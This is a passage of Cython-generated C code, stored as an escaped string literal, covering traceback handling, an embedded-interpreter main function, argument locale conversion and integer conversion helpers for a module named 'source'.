py_srcfile,   /*PyObject *filename,*/\n        py_funcname,  /*PyObject *name,*/\n        py_line,\n        __pyx_empty_bytes  /*PyObject *lnotab*/\n    );\n    Py_DECREF(py_srcfile);\n    #else\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\n    #endif\n    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline\n    return py_code;\nbad:\n    Py_XDECREF(py_funcname);\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_srcfile);\n    #endif\n    return NULL;\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyCodeObject *py_code = 0;\n    PyFrameObject *py_frame = 0;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject *ptype, *pvalue, *ptraceback;\n    if (c_line) {\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\n    }\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\n    if (!py_code) {\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n        py_code = __Pyx_CreateCodeObjectForTraceback(\n            funcname, c_line, py_line, filename);\n        if (!py_code) {\n            /* If the code object creation fails, then we should clear the\n               fetched exception references and propaga""te the new exception */\n            Py_XDECREF(ptype);\n            Py_XDECREF(pvalue);\n            Py_XDECREF(ptraceback);\n            goto bad;\n        }\n        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);\n    }\n    py_frame = PyFrame_New(\n        tstate,            /*PyThreadState *tstate,*/\n        py_code,           /*PyCodeObject *code,*/\n        __pyx_d,    /*PyObject *globals,*/\n        0                  /*PyObject *locals*/\n    );\n    if (!py_frame) goto bad;\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\n    PyTraceBack_Here(py_frame);\nbad:\n    Py_XDECREF(py_code);\n    Py_XDECREF(py_frame);\n}\n\n/* MainFunction */\n#ifdef __FreeBSD__\n#include <floatingpoint.h>\n#endif\n#if PY_MAJOR_VERSION < 3\nint main(int argc, char** argv) {\n#elif defined(WIN32) || defined(MS_WINDOWS)\nint wmain(int argc, wchar_t **argv) {\n#else\nstatic int __Pyx_main(int argc, wchar_t **argv) {\n#endif\n    /* 754 requires that FP exceptions run in \"no stop\" mode by default,\n     * and until C vendors implement C99's ways to control FP exceptions,\n     * Python requires non-stop mode.  Alas, some platforms enable FP\n     * exceptions by default.  Here we disable them.\n     */\n#ifdef __FreeBSD__\n    fp_except_t m;\n    m = fpgetmask();\n    fpsetmask(m & ~FP_X_OFL);\n#endif\n    if (argc && argv)\n        Py_SetProgramName(argv[0]);\n    Py_Initialize();\n    if (argc && argv)\n        PySys_SetArgv(argc, argv);\n    {\n      PyObject* m = NULL;\n      __pyx_module_is_main_source = 1;\n      #if PY_MAJOR_VERSION < 3\n          initsource();\n      #elif CYTHON_PEP489_MULTI_PHASE_INIT\n          m = PyInit_source();\n          if (!PyModule_Check(m)) {\n              PyModuleDef *mdef = (PyModuleDef *) m;\n              PyObject *modname = PyUnicode_FromString(\"__main__\");\n              m = NULL;\n              if (modname) {\n                  m = PyModule_NewOb""ject(modname);\n                  Py_DECREF(modname);\n                  if (m) PyModule_ExecDef(m, mdef);\n              }\n          }\n      #else\n          m = PyInit_source();\n      #endif\n      if (PyErr_Occurred()) {\n          PyErr_Print();\n          #if PY_MAJOR_VERSION < 3\n          if (Py_FlushLine()) PyErr_Clear();\n          #endif\n          return 1;\n      }\n      Py_XDECREF(m);\n    }\n#if PY_VERSION_HEX < 0x03060000\n    Py_Finalize();\n#else\n    if (Py_FinalizeEx() < 0)\n        return 2;\n#endif\n    return 0;\n}\n#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)\n#include <locale.h>\nstatic wchar_t*\n__Pyx_char2wchar(char* arg)\n{\n    wchar_t *res;\n#ifdef HAVE_BROKEN_MBSTOWCS\n    /* Some platforms have a broken implementation of\n     * mbstowcs which does not count the characters that\n     * would result from conversion.  Use an upper bound.\n     */\n    size_t argsize = strlen(arg);\n#else\n    size_t argsize = mbstowcs(NULL, arg, 0);\n#endif\n    size_t count;\n    unsigned char *in;\n    wchar_t *out;\n#ifdef HAVE_MBRTOWC\n    mbstate_t mbs;\n#endif\n    if (argsize != (size_t)-1) {\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\n        if (!res)\n            goto oom;\n        count = mbstowcs(res, arg, argsize+1);\n        if (count != (size_t)-1) {\n            wchar_t *tmp;\n            /* Only use the result if it contains no\n               surrogate characters. */\n            for (tmp = res; *tmp != 0 &&\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\n                ;\n            if (*tmp == 0)\n                return res;\n        }\n        free(res);\n    }\n#ifdef HAVE_MBRTOWC\n    /* Overallocate; as multi-byte characters are in the argument, the\n       actual output could use less memory. */\n    argsize = strlen(arg) + 1;\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    memset(&""mbs, 0, sizeof mbs);\n    while (argsize) {\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\n        if (converted == 0)\n            break;\n        if (converted == (size_t)-2) {\n            /* Incomplete character. This should never happen,\n               since we provide everything that we have -\n               unless there is a bug in the C library, or I\n               misunderstood how mbrtowc works. */\n            fprintf(stderr, \"unexpected mbrtowc result -2\\\\n\");\n            free(res);\n            return NULL;\n        }\n        if (converted == (size_t)-1) {\n            /* Conversion error. Escape as UTF-8b, and start over\n               in the initial shift state. */\n            *out++ = 0xdc00 + *in++;\n            argsize--;\n            memset(&mbs, 0, sizeof mbs);\n            continue;\n        }\n        if (*out >= 0xd800 && *out <= 0xdfff) {\n            /* Surrogate character.  Escape the original\n               byte sequence with surrogateescape. */\n            argsize -= converted;\n            while (converted--)\n                *out++ = 0xdc00 + *in++;\n            continue;\n        }\n        in += converted;\n        argsize -= converted;\n        out++;\n    }\n#else\n    /* Cannot use C locale for escaping; manually escape as if charset\n       is ASCII (i.e. escape all bytes > 128. This will still roundtrip\n       correctly in the locale's charset, which must be an ASCII superset. */\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    while(*in)\n        if(*in < 128)\n            *out++ = *in++;\n        else\n            *out++ = 0xdc00 + *in++;\n    *out = 0;\n#endif\n    return res;\noom:\n    fprintf(stderr, \"out of memory\\\\n\");\n    return NULL;\n}\nint\nmain(int argc, char **argv)\n{\n    if (!argc) {\n        return __Pyx_main(0, NULL);\n    }\n    else {\n        int i, res;\n        wchar_t **argv_""copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        char *oldloc = strdup(setlocale(LC_ALL, NULL));\n        if (!argv_copy || !argv_copy2 || !oldloc) {\n            fprintf(stderr, \"out of memory\\\\n\");\n            free(argv_copy);\n            free(argv_copy2);\n            free(oldloc);\n            return 1;\n        }\n        res = 0;\n        setlocale(LC_ALL, \"\");\n        for (i = 0; i < argc; i++) {\n            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);\n            if (!argv_copy[i]) res = 1;\n        }\n        setlocale(LC_ALL, oldloc);\n        free(oldloc);\n        if (res == 0)\n            res = __Pyx_main(argc, argv_copy);\n        for (i = 0; i < argc; i++) {\n#if PY_VERSION_HEX < 0x03050000\n            free(argv_copy2[i]);\n#else\n            PyMem_RawFree(argv_copy2[i]);\n#endif\n        }\n        free(argv_copy);\n        free(argv_copy2);\n        return res;\n    }\n}\n#endif\n\n/* CIntToPy */\n    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (is_unsigned) {\n        if (sizeof(long) < sizeof(long)) {\n            return PyInt_FromLong((long) value);\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\n            return PyLong_FromUnsignedLong((unsigned long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\n#endif\n        }\n    } else {\n        if (sizeof(long) <= sizeof(long)) {\n            return PyInt_FromLong((long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (s""izeof(long) <= sizeof(PY_LONG_LONG)) {\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\n#endif\n        }\n    }\n    {\n        int one = 1; int little = (int)*(unsigned char *)&one;\n        unsigned char *bytes = (unsigned char *)&value;\n        return _PyLong_FromByteArray(bytes, sizeof(long),\n                                     little, !is_unsigned);\n    }\n}\n\n/* CIntFromPyVerify */\n    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\n#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\n    {\\\n        func_type value = func_value;\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\n            if (unlikely(value != (func_type) (target_type) value)) {\\\n                func_type zero = 0;\\\n                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\\\n                    return (target_type) -1;\\\n                if (is_unsigned && unlikely(value < zero))\\\n                    goto raise_neg_overflow;\\\n                else\\\n                    goto raise_overflow;\\\n            }\\\n        }\\\n        return (target_type) value;\\\n    }\n\n/* CIntFromPy */\n    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_Check(x))) {\n        if (sizeof(long) < sizeof(long)) {\n            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);""\n            if (is_unsigned && unlikely(val < 0)) {\n                goto raise_neg_overflow;\n            }\n            return (long) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (long) 0;\n                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])\n                case 2:\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {\n                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {\n                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLo""ng_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {\n                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n            }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (long) -1;\n                if (unlikely(result == 1))\n                    goto raise_neg_overflow;\n            }\n#endif\n            if (sizeof(long) <= sizeof(unsigned long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (long) 0;\n                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))\n                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])\n                case -2:\n                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } e""lse if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                            return (long) ((((((((long)d""igits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n            }\n#endif\n            if (sizeof(long) <= sizeof(long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\n#end""if\n            }\n        }\n        {\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\n            PyErr_SetString(PyExc_RuntimeError,\n                            \"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\");\n#else\n            long val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n #if PY_MAJOR_VERSION < 3\n            if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(tmp);\n                Py_DECREF(tmp);\n            }\n #endif\n            if (likely(v)) {\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                              bytes, sizeof(val),\n                                              is_little, !is_unsigned);\n                Py_DECREF(v);\n                if (likely(!ret))\n                    return val;\n            }\n#endif\n            return (long) -1;\n        }\n    } else {\n        long val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (long) -1;\n        val = __Pyx_PyInt_As_long(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"value too large to convert to long\");\n    return (long) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"can't convert negative value to long\");\n    return (long) -1;\n}\n\n/* CIntFromPy */\n    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const int neg_one = (int) -1, const_zero = (int) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if"" (likely(PyInt_Check(x))) {\n        if (sizeof(int) < sizeof(long)) {\n            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);\n            if (is_unsigned && unlikely(val < 0)) {\n                goto raise_neg_overflow;\n            }\n            return (int) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (int) 0;\n                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])\n                case 2:\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {\n                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {\n                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\n            ""            if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {\n                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n            }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (int) -1;\n                if (unlikely(result == 1))\n                    goto raise_neg_overflow;\n            }\n#endif\n            if (sizeof(int) <= sizeof(unsigned long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (int) 0;\n                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))\n                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])\n                case -2:\n                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n              ""              __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0""])))\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\n                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n            }\n#endif\n            if (sizeof(int) <= sizeof(long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(int) <= ""sizeof(PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n            }\n        }\n        {\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\n            PyErr_SetString(PyExc_RuntimeError,\n                            \"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\");\n#else\n            int val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n #if PY_MAJOR_VERSION < 3\n            if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(tmp);\n                Py_DECREF(tmp);\n            }\n #endif\n            if (likely(v)) {\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                              bytes, sizeof(val),\n                                              is_little, !is_unsigned);\n                Py_DECREF(v);\n                if (likely(!ret))\n                    return val;\n            }\n#endif\n            return (int) -1;\n        }\n    } else {\n        int val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (int) -1;\n        val = __Pyx_PyInt_As_int(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"value too large to convert to int\");\n    return (int) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"can't convert negative value to int\");\n    return (int) -1;\n}\n\n/* FastTypeChecks */\n    #if CYTHON_COMPILING_IN_CPYTHON\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\n    while (a) {\n        a = a->tp_base;\n        if (a == b)\n            return 1;\n    }\n    return b == &PyBaseObject_Type;\n}\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObj""ect *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (a == b) return 1;\n    mro = a->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(a, b);\n}\n#if PY_MAJOR_VERSION == 2\nstatic int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {\n    PyObject *exception, *value, *tb;\n    int res;\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ErrFetch(&exception, &value, &tb);\n    res = exc_type1 ? 